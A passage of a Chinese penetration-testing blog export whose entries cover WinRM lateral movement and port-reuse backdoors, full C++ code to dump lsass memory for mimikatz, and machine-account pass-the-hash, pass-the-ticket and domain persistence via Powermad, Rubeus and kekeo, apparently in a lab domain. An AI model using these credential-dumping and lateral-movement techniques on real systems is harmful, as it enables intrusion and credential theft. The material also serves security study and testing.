<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrs -r:http://10.10.10.12:5985 -u:administrator -p:xxxxx &quot;net localgroup administrators&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192808642.png" alt="image-20210926192808642"></p>
<p>也可利用msf 的 web_delivery模块远程无文件上线msf。此模块将生成一个将在本地托管的有效载荷，并将生成需要在目标上执行的powershell命令。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use multi/script/web_delivery</span><br></pre></td></tr></table></figure>

<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192818719.png" alt="image-20210926192818719"></p>
<p><strong>利用winrs远程执行:</strong></p>
<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192827384.png" alt="image-20210926192827384"></p>
<h2 id="元破解"><a href="#元破解" class="headerlink" title="元破解"></a>元破解</h2><p>MSF 有几个模块，可用于发现开启了WinRM服务的主机、发现凭证以进行服务身份验证以及执行任意命令和代码。以下模块可以发现启用了WinRM 服务的系统机器支持的身份验证协议。</p>
<h3 id="探测WinRM验证方式"><a href="#探测WinRM验证方式" class="headerlink" title="探测WinRM验证方式"></a>探测WinRM验证方式</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">auxiliary/scanner/winrm/winrm_auth_methods</span><br></pre></td></tr></table></figure>

<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192845668.png" alt="image-20210926192845668"></p>
<h3 id="探测票据有效性"><a href="#探测票据有效性" class="headerlink" title="探测票据有效性"></a>探测票据有效性</h3><p>如果已经获得服务器上的缓存票据，则这些票据可用于通过<strong>WinRM</strong>服务与其他主机进行身份验证。以下模块可检测票据是否对其他主机有效。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auxiliary/scanner/winrm/winrm_login </span><br></pre></td></tr></table></figure>

<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192855464.png" alt="image-20210926192855464"></p>
<h3 id="利用票据执行命令"><a href="#利用票据执行命令" class="headerlink" title="利用票据执行命令"></a>利用票据执行命令</h3><p>通过<strong>WinRM</strong> 服务执行任意命令。此模块需要本地管理员凭据、域和目标主机。</p>
<p>此处未能成功执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auxiliary/scanner/winrm/winrm_cmd</span><br></pre></td></tr></table></figure>

<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192903042.png" alt="image-20210926192903042"></p>
<p>也可利用WinRM和以下模块执行命令。该模块需要本地管理员凭证和代码将执行的主机列表。此模块可用于横向移动到域内主机。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exploit/windows/winrm/winrm_script_exec</span><br></pre></td></tr></table></figure>

<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192912391.png" alt="image-20210926192912391"></p>
<h2 id="其他利用手段"><a href="#其他利用手段" class="headerlink" title="其他利用手段"></a>其他利用手段</h2><p>​    <strong>1.开启3389远程桌面控制</strong></p>
<p>​    若开启了WinRM,可利用PeekABoo工具或直接对注册表操作开启3389端口</p>
<p>​    <strong>2.端口复用做后门</strong></p>
<p>​    将WInRM监听端口由5985改为80或443等常用端口，及时端口被Web服务占用也不会影响，并且不会影响web服务的执行：</p>
<p>​    （1）配置目标WinRM服务，更改监听端口开启复用模式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm set winrm/config/Listener?Address=*+Transport=HTTP @&#123;Port=&quot;80&quot;&#125;</span><br><span class="line">winrm set winrm/config/service @&#123;EnableCompatibilityHttpListener=&quot;true&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>​    （2）链接目标</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrs -r:http://192.168.1.152 -u:administrator -p:xxxx cmd</span><br></pre></td></tr></table></figure>

<p>​    此方法适用于存在web服务的主机，并不会再开启新端口，较为隐蔽。</p>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>从转储lsass学习Windows安全</title>
    <url>/2022/11/19/%E4%BB%8E%E8%BD%AC%E5%82%A8lsass%E5%85%A5%E6%89%8B%E5%AD%A6%E4%B9%A0Windows%E8%BF%9B%E7%A8%8B%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h4 id="0x1-前置理论"><a href="#0x1-前置理论" class="headerlink" title="0x1 前置理论"></a>0x1 前置理论</h4><h5 id="访问令牌-Access-Token"><a href="#访问令牌-Access-Token" class="headerlink" title="访问令牌(Access Token)"></a>访问令牌(Access Token)</h5><p>​    <code>Access Token</code>是描述进程或线程的安全上下文的对象。其中包括进程或线程关联的用户账户的身份和权限。</p>
<p>​    <code>Access Token</code>分为授权令牌(Delegation Token)、模拟令牌(Impersonation token)两种。</p>
<p>Access Token包含以下信息</p>
<ul>
<li><p>用户帐户的<a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/security-identifiers">安全标识符</a>(SID)</p>
</li>
<li><p>用户所属组的 SID</p>
</li>
<li><p>标识当前<a href="https://learn.microsoft.com/en-us/windows/desktop/SecGloss/l-gly"><em>登录会话</em></a>的<a href="https://learn.microsoft.com/en-us/windows/desktop/SecGloss/l-gly"><em>登录 SID</em></a></p>
</li>
<li><p>用户或用户组拥有的<a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/privileges">权限</a>列表</p>
</li>
<li><p>所有者 SID</p>
</li>
<li><p>主要组的 SID</p>
</li>
<li><p><a href="https://learn.microsoft.com/en-us/windows/desktop/SecGloss/s-gly"><em>用户在未指定安全描述符</em></a>的情况下创建安全对象时系统使用的默认<a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists">DACL</a></p>
</li>
<li><p>访问令牌的来源</p>
</li>
<li><p>令牌是<a href="https://learn.microsoft.com/en-us/windows/desktop/SecGloss/p-gly"><em>主要</em></a>令牌还是<a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation">模拟</a>令牌</p>
</li>
<li><p>可选的<a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/restricted-tokens">限制 SID列表</a></p>
</li>
<li><p>当前模拟级别</p>
</li>
<li><p>其他统计</p>
<span id="more"></span></li>
</ul>
<p>​    <strong>Delegation Token：</strong> 用以交互式会话登陆（本地用户登陆、远程桌面等）</p>
<p>​    <strong>Impersonation Token：</strong> 用以非交互式登陆(net user、远程共享访问)</p>
<p>​    不同的用户登陆计算机后，都会生成一个Access Token,该token会在用户创建进程/线程时都会复制一份<code>Access token</code>用于描述与该进程相关联的用户账户的安全上下文，默认情况下，当进程的线程与安全对象交互时，系统使用<code>授权令牌</code>。此外，线程可以模拟客户帐户。模拟允许线程使用客户端的安全上下文与安全对象进行交互。模拟客户端的线程同时具有<code>授权令牌</code>和<code>模拟令牌</code>。当用户注销后系统会将<code>授权令牌</code>转换为<code>模拟令牌</code>，并在重启系统后清除。</p>
<h5 id="安全对象"><a href="#安全对象" class="headerlink" title="安全对象"></a>安全对象</h5><p>安全对象是可以拥有<code>安全描述符</code>的对象，所有命名的Windows对象都是安全对象。一些未命名的对象，例如<code>进程</code>和<code>线程</code>对象也可以拥有安全描述符。。对于大多数的安全对象来说，我们可以在创建对象的函数调用中指定对象的<code>安全描述符</code>。</p>
<p><img src="/../images/%E4%BB%8E%E8%BD%AC%E5%82%A8lsass%E5%85%A5%E6%89%8B%E5%AD%A6%E4%B9%A0Windows%E8%BF%9B%E7%A8%8B%E5%AE%89%E5%85%A8.assets/image-20221119200455694.png" alt="image-20221119200455694"></p>
<h5 id="安全描述符"><a href="#安全描述符" class="headerlink" title="安全描述符"></a>安全描述符</h5><p>包含与安全对象关联的安全信息。安全描述符由<a href="https://learn.microsoft.com/en-us/windows/desktop/api/Winnt/ns-winnt-security_descriptor"><strong>SECURITY_DESCRIPTOR</strong></a>结构及其关联的安全信息组成。安全描述符可以包括以下安全信息：</p>
<ul>
<li>对象所有者和主要组的安全标识符（SID)。</li>
<li>指定允许或拒绝特定用户或组的访问权限的DACL</li>
<li>指定为对象生成审计记录的访问尝试类型的SACL。</li>
<li>一组控制位，用以限定安全描述符或其各个成员的含义。</li>
</ul>
<h5 id="访问控制列表-Access-control-lists"><a href="#访问控制列表-Access-control-lists" class="headerlink" title="访问控制列表(Access control lists)"></a>访问控制列表(Access control lists)</h5><p>​    访问控制列表(ACL)是访问控制条目(ACE)的列表。ACL中每个ACE都标示一个受托者，并为该受托者指定访问权限。安全对象的安全描述符可以包含两种类型的ACL:<code>DACL</code>以及<code>SACL</code>。</p>
<ul>
<li>自由访问控制列表(DACL) 标示允许或者拒绝访问安全对象的受托人。当<code>进程</code>试图访问安全对象时，系统会检查对象的 DACL 中的 ACE，以确定是否授予对它的访问权限。如果对象没有 DACL，系统会授予每个人<code>Full Access</code>权限。如果对象的 DACL 没有 ACE，系统将拒绝所有访问该对象的尝试，因为 DACL 中没有可以通过匹配的ACE条目。系统按顺序检查 ACE，直到它找到一个或多个允许所有请求的访问权限的 ACE，或者直到任何一个请求的访问权限被拒绝。</li>
<li>系统访问控制列表(SACL) 使管理员能够记录访问受保护对象的尝试。每个 ACE 指定特定受托者进行的访问尝试的类型，这些访问尝试会导致系统在安全事件日志中生成记录。SACL 中的 ACE 可以在访问尝试失败和/或成功时生成审计记录。</li>
</ul>
<h5 id="受托人"><a href="#受托人" class="headerlink" title="受托人"></a>受托人</h5><p>​    受托人是应用访问控制条目(ACE)的用户账户、组账户或者登陆会话。访问控制列表(ACL)中的每个ACE都有一个标示受托人的安全描述符（SID）。</p>
<p>​    根据前置知识，我们可以得到用户登陆系统后创建进程、线程，程序访问安全对象时的权限会是怎么样的了。</p>
<p>​    当用户登陆计算机，凭证验证通过后便会拿到一份访问令牌(Access Token)，该Token在我们创建进程或线程时会被使用，拷贝explorer.exe中的该用户的访问令牌到新的进程/线程当中用以权限分配。</p>
<p>​    当程序访问安全对象时，安全对象会检测自身的<code>DACL</code>，若DACL不存在，则对所有程序开放访问权限；若DACL存在，会按顺序查找DACL内的ACL与程序的访问令牌比较判断，判断其是否具有访问权限。</p>
<p><img src="/../images/%E4%BB%8E%E8%BD%AC%E5%82%A8lsass%E5%85%A5%E6%89%8B%E5%AD%A6%E4%B9%A0Windows%E8%BF%9B%E7%A8%8B%E5%AE%89%E5%85%A8.assets/image-20221119204452825.png" alt="image-20221119204452825"></p>
<h5 id="MiniDumpWriteDump函数"><a href="#MiniDumpWriteDump函数" class="headerlink" title="MiniDumpWriteDump函数"></a>MiniDumpWriteDump函数</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">MiniDumpWriteDump</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] HANDLE                            hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] DWORD                             ProcessId,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] HANDLE                            hFile,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] MINIDUMP_TYPE                     DumpType,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PMINIDUMP_CALLBACK_INFORMATION    CallbackParam</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight clojure"><table><tr><td class="code"><pre><span class="line">https://learn.microsoft.com/en-us/windows/win<span class="number">32</span>/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump</span><br></pre></td></tr></table></figure>

<p>函数结构如上所示，可利用此函数将进程转储，本文将Lsass.exe转储用以提取Hash。</p>
<h4 id="0x2实现代码"><a href="#0x2实现代码" class="headerlink" title="0x2实现代码"></a>0x2实现代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;DbgHelp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;DbgHelp.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	HANDLE LsassHandle = <span class="literal">NULL</span>;</span><br><span class="line">	HANDLE OutFile = <span class="built_in">CreateFile</span>(<span class="string">L&quot;LSASS.DMP&quot;</span>,GENERIC_WRITE|GENERIC_READ,<span class="number">0</span>,<span class="literal">NULL</span>,CREATE_ALWAYS,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">	DWORD PID;</span><br><span class="line">	HANDLE Snapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS,<span class="number">0</span>);</span><br><span class="line">	PROCESSENTRY32 Entry;</span><br><span class="line">	Entry.dwSize = <span class="built_in"><span class="keyword">sizeof</span></span>(PROCESSENTRY32);</span><br><span class="line">	LPWSTR ProcessName;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//查找lsass进程pid</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">Process32First</span>(Snapshot, &amp;Entry)) &#123;</span><br><span class="line">		ProcessName = Entry.szExeFile;</span><br><span class="line">		PID = Entry.th32ProcessID;</span><br><span class="line">		<span class="keyword">while</span> (_wcsicmp(<span class="string">L&quot;lsass.exe&quot;</span>,ProcessName)!=<span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">Process32Next</span>(Snapshot, &amp;Entry);</span><br><span class="line">			ProcessName = Entry.szExeFile;</span><br><span class="line">			PID = Entry.th32ProcessID;</span><br><span class="line">		&#125;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;lsass,exe pid is :&quot;</span> &lt;&lt; PID &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;snapshot error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//拿到lsass进程句柄</span></span><br><span class="line">	LsassHandle = <span class="built_in">OpenProcess</span>(</span><br><span class="line">		PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE,</span><br><span class="line">		<span class="literal">false</span>,</span><br><span class="line">		PID</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//利用MiniDumpWriteDump 转储lsass</span></span><br><span class="line">	BOOL status = <span class="built_in">MiniDumpWriteDump</span>(LsassHandle, PID, OutFile,MiniDumpWithFullMemory,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (status)</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;process dumping succeeded!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>效果展示，另外，若在解密文件时出现<code>ERROR kuhl_m_sekurlsa_acquireLSA ; Key import</code>，可尝试低版本mimikatz离线解密。 如2.1.1版本。</p>
<p><img src="/../images/%E4%BB%8E%E8%BD%AC%E5%82%A8lsass%E5%85%A5%E6%89%8B%E5%AD%A6%E4%B9%A0Windows%E8%BF%9B%E7%A8%8B%E5%AE%89%E5%85%A8.assets/image-20221119215425139.png" alt="image-20221119215425139"></p>
<p><img src="/../images/%E4%BB%8E%E8%BD%AC%E5%82%A8lsass%E5%85%A5%E6%89%8B%E5%AD%A6%E4%B9%A0Windows%E8%BF%9B%E7%A8%8B%E5%AE%89%E5%85%A8.assets/image-20221119215253912.png" alt="image-20221119215253912"></p>
<h4 id="0x3参考文章"><a href="#0x3参考文章" class="headerlink" title="0x3参考文章"></a>0x3参考文章</h4><p><a href="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass">https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass</a></p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump">https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump</a></p>
]]></content>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>利用机器账户进行域提权</title>
    <url>/2022/02/19/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<p>pass the hash攻击，除去常见的使用本地管理员账户进行hash传递外，还可以使用机器账户进行提权。</p>
<p>如果在主机上授予了本地管理员访问权限，并且计算机本身为<code>Domain admins</code>组的成员，那我们在进行渗透测试时，可以利用该计算机账户进行提权。以机器账户来使用hash传递来进行提权。</p>
<span id="more"></span>

<p><strong>环境模拟：</strong></p>
<p>WIN2016.attack.local 10.10.10.128 主机在Domain admins组下</p>
<p>已经获得WIN2016机器的本地管理员权限</p>
<h4 id="识别计算机账户所在组"><a href="#识别计算机账户所在组" class="headerlink" title="识别计算机账户所在组"></a>识别计算机账户所在组</h4><h5 id="Active-Directory模块查找可用计算机账户"><a href="#Active-Directory模块查找可用计算机账户" class="headerlink" title="Active Directory模块查找可用计算机账户"></a>Active Directory模块查找可用计算机账户</h5><p>利用Powershell中的Active Directory模块来识别当前计算机所在组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-ADComputer -Filter * -Properties MemberOf | ? &#123;$_.MemberOf&#125;</span><br></pre></td></tr></table></figure>

<p>不过很遗憾，我在普通权限下的域主机中，未能通过此命令查找到任何可用计算机账户，即使我已经在前一步将本机的计算机账户添加进高权限组内也未能查找到任何有效信息，唯有在域控机下才查找到了结果。</p>
<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E6%8F%90%E6%9D%83.assets/image-20220219232329157.png" alt="image-20220219232329157"></p>
<p>但很显然，在域管机器下可查找在当前我们所需要的条件下根本就不现实，因此我们可以选择另一个方法进行信息收集，查找可用主机账户进行提权。</p>
<h5 id="net-group查找"><a href="#net-group查找" class="headerlink" title="net group查找"></a>net group查找</h5><p>利用net group 查找敏感组内是否存在可用机器账户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;domain admins&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E6%8F%90%E6%9D%83.assets/image-20220219232657449.png" alt="image-20220219232657449"></p>
<h5 id="导出WIN2016-账户的NTLM-hash"><a href="#导出WIN2016-账户的NTLM-hash" class="headerlink" title="导出WIN2016$账户的NTLM hash"></a>导出WIN2016$账户的NTLM hash</h5><p>利用mimikatz模块导出WIN2016$账户的NTLM hash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::msv</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E6%8F%90%E6%9D%83.assets/image-20220219233211803.png" alt="image-20220219233211803"></p>
<h5 id="以WIN2016-账户进行pth"><a href="#以WIN2016-账户进行pth" class="headerlink" title="以WIN2016$账户进行pth"></a>以WIN2016$账户进行pth</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::pth /user:WIN2016$ /ntlm:56c1672b5bb172505748aade48865c07 /domain:attack.local</span><br></pre></td></tr></table></figure>

<p>可以看到，在pth攻击前，我们无法访问dc的共享目录</p>
<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E6%8F%90%E6%9D%83.assets/image-20220219233443844.png" alt="image-20220219233443844"></p>
<p>执行后</p>
<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E6%8F%90%E6%9D%83.assets/image-20220219233502296.png" alt="image-20220219233502296"></p>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>利用机器账户进行域维权</title>
    <url>/2022/02/15/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>机器账户在许多技术中可以用于提权或横向移动，如使用机器账户的委派进行dcsync，使用机器账户也可进行维权操作。我们可以将任意计算机账户添加到高权限组(例如Domain Admin、Domain Controllers、Enterprise Admins) 或对计算机账户的userAccountControl属性进行修改。使用这两种方式，我们可以通过机器账户在域内进行身份认证（因为密码已知）并进行提权操作，例如Dcsync拖取域内hash。</p>
<p>除了上述作用，使用机器账户也可进行域维权操作。我们可以将任意计算机账户添加到高权限组(例如Domain Admin、Domain Controllers、Enterprise Admins) 或对计算机账户的<code>userAccountControl</code>属性进行修改。使用这两种方式，我们可以通过机器账户在域内进行身份认证（因为密码已知）并进行提权操作，例如Dcsync拖取域内hash。</p>
<span id="more"></span>

<h2 id="userAccountControl说明"><a href="#userAccountControl说明" class="headerlink" title="userAccountControl说明"></a>userAccountControl说明</h2><p>默认的情况下，域中的标准用户最多可以创建10个机器账户，这是由<strong>ms-DS-MachineAccountQuota</strong>进行设定的。我们可以使用Powermad等工具从加入域和未加入域的主机中进行添加账户操作。但为了让机器账户在域中显示为域控制器，我们还需要将<code>userAccountControl</code>属性设置为0x2000(SERVER_TRUST_ACCOUNT)的值。0x2000换算为十进制数字为8192.修改此属性需要域管理员级别的权限。下面我们从ADSI编辑器中进行修改，改为8192</p>
<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217123153176.png" alt="image-20220217123153176"></p>
<h2 id="PowerMad-Active-Directory组合"><a href="#PowerMad-Active-Directory组合" class="headerlink" title="PowerMad+Active Directory组合:"></a>PowerMad+Active Directory组合:</h2><h3 id="添加机器账户"><a href="#添加机器账户" class="headerlink" title="添加机器账户"></a>添加机器账户</h3><p>我们在进行维权时，可以从利用工具从命令行创建机器账户。例如Standln、SharpMad以及PowerMad等工具；下面展示如何利用PowerMad在域内添加一个机器账户。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount Nayon -Domain attack.local -DomainController dc.attack.local</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217123705198.png" alt="image-20220217123705198"></p>
<p>此时我们便添加机器账户成功了，利用如下命令查看:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217124450971.png" alt="image-20220217124450971"></p>
<h3 id="修改机器账户userAccountControl属性值"><a href="#修改机器账户userAccountControl属性值" class="headerlink" title="修改机器账户userAccountControl属性值"></a>修改机器账户userAccountControl属性值</h3><p>我们所创建的这台机器账户primarygroupid经过查询可知是515，他是域组的RID，表示这是一台域计算机，利用Active-Module模块，使用域管权限账户为计算机账户Nayon修改<code>userAccountControl</code>值为8192，则primarygroupid将更改为属于域控制器（可写）的 516。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-ADComputer Nayon -pro * | Select-object name, primarygroupid, useraccountcontrol</span><br><span class="line">Set-ADComputer Nayon -replace @&#123; &quot;userAccountcontrol&quot; = 8192 &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217125926482.png" alt="image-20220217125926482"></p>
<p>[^此处若发现域主机内不存在Active Directory模块，可在本地上传Microsoft.ActiveDirectory.Management .dll在Powershell利用import-module 进行安装使用]: </p>
<p>此处为执行效果。</p>
<h3 id="获得机器账户hash"><a href="#获得机器账户hash" class="headerlink" title="获得机器账户hash"></a>获得机器账户hash</h3><p>由于我们已知机器账户的密码，因此我们可以利用它的NTLM 、aes128、aes256 hash 来进行pth，用于获得一个拥有域控制器权限的会话。</p>
<p>利用Rubes将Nayon账户的明文密码转为NTLM hash，用于维权时进行的pth。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe hash /user:Nayon /password:Password@1! /domain:attack.local</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217182940119.png" alt="image-20220217182940119"></p>
<p>如图所示，成功拿到了机器账户的hash。</p>
<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式:"></a>利用方式:</h3><h4 id="PTH传递获得权限"><a href="#PTH传递获得权限" class="headerlink" title="PTH传递获得权限"></a>PTH传递获得权限</h4><p>在域内机器上利用mimikatz进行pth攻击，成功弹回具有Nayon用户权限的新会话。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::pth /user:Nayon /domain:attack.local /aes128:95F9380561068098A673F425207EFA0D</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217183728074.png" alt="image-20220217183728074"></p>
<p><strong>注意：此处拿到的会话，唯有域用户处于高权限组内才可使用dcsync获得域内hash。</strong></p>
<h4 id="利用PTT获得权限"><a href="#利用PTT获得权限" class="headerlink" title="利用PTT获得权限"></a>利用PTT获得权限</h4><p>由于PTH是需要本地管理员权限的，若我们此时连本地管理员权限都没有，我们还可以使用mimikatz自带的ptt功能拿到相应权限。</p>
<p><strong>注意：此处拿到的会话，本人本地测试即使是将机器用户的<code>userAccountConrol</code>属性值改为8192也无法执行dcsync获得域内hash，唯有划入域内高权限组内可以使用机器账户权限执行dcsync。</strong></p>
<p>利用利用Rubes申请拿到机器账户的hash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe hash /user:Nayon /password:123456 /domain:attack.local</span><br></pre></td></tr></table></figure>

<p>使用keke申请tgt票据，用于下一步的ptt攻击</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tgt::ask /user:Nayon2 /domain:attack.local /ntlm:32ED87BDB5FDC5E9CBA88547376818D4</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220219181751543.png" alt="image-20220219181751543"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt  TGT_Nayon@ATTACK.LOCAL_krbtgt~attack.local@ATTACK.LOCAL.kirbi</span><br></pre></td></tr></table></figure>

